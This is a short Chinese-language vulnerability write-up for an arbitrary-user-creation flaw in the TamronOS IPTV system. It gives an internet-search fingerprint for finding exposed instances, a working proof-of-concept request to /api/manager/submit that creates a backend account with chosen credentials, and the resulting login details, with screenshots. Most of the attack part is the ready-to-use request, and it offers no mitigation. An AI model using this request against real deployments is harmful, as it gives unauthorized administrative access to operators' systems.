# TamronOS IPTV系统 submit 任意用户创建漏洞

## 漏洞描述

TamronOS IPTV系统 /api/manager/submit 存在任意用户创建漏洞，攻击者通过漏洞可以任意用户创建进入后台

## 漏洞影响

```
TamronOS IPTV系统
```

## 网络测绘

```
app="TamronOS-IPTV系统"
```

## 漏洞复现

登录页面如下



![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115012737.png)



## 漏洞POC为



```plain
/api/manager/submit?group=1&username=test&password=123456
```



![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115012738.png)



```plain
user: test
pass: 123456
```



![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115012739.png)